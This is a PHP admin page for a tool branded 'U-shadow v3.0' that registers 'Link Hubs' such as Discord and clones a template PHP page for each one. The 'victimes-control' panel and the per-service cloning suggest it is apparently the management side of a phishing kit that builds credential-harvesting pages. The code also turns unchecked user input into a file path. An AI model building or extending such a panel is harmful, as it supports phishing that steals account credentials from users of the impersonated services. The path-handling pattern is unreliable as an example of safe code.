<?php
require_once __DIR__ . '/../config.php';
if (!isset($_SESSION['user']) || !($_SESSION['user']['is_admin'] ?? false)) {
    header('Location: index.php');
    exit;
}

$success = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        die('Invalid CSRF token');
    }

    $new_cat = trim(filter_input(INPUT_POST, 'category', FILTER_SANITIZE_STRING));
    if ($new_cat) {
        $categories = json_decode(file_get_contents(CATEGORIES_FILE), true);
        if (!in_array($new_cat, $categories)) {
            $categories[] = $new_cat;
            file_put_contents(CATEGORIES_FILE, json_encode($categories));

            // Create the template file for the new category
            $filename = strtolower($new_cat) . '.php';
            if (!file_exists($filename)) {
                copy(__DIR__ . '/../template.php', $filename);
            }
            $success = "Link Hub for '$new_cat' added successfully!";
        } else {
            $error = "Hub already exists.";
        }
    }
}

$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);
$csrf_token = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Manage Hubs</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<header>
    <div class="logo">U-SHADOW</div>
</header>

<nav>
    <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="logout.php">Logout</a></li>
    </ul>
</nav>

<div class="main-container">
    <div class="victimes-control" style="flex: 1;">
        <div class="panel-header">Manage Integration Hubs</div>
        <div class="panel-body">
            <?php if ($success): ?>
                <p style="color: green; text-align: center; font-weight: bold;"><?php echo s($success); ?></p>
            <?php endif; ?>
            <?php if ($error): ?>
                <p style="color: red; text-align: center; font-weight: bold;"><?php echo s($error); ?></p>
            <?php endif; ?>

            <form action="admin_categories.php" method="POST" style="text-align: center; margin-bottom: 20px;">
                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                <p>New Hub Name (e.g., Discord):</p>
                <input type="text" name="category" placeholder="Hub Name" required style="width: 80%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px;">
                <br>
                <button type="submit" style="width: 80%;">Add New Hub</button>
            </form>

            <hr>
            <h3>Existing Integration Hubs</h3>
            <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                <?php foreach ($categories as $cat): ?>
                    <div style="padding: 10px; background: #eee; border: 1px solid #ddd; border-radius: 5px; width: 120px; text-align: center;">
                        <strong><?php echo s($cat); ?></strong>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    Copyright 2010-2025 | Developed By K24KDX <br>
    U-shadow v3.0
</div>

</body>
</html>
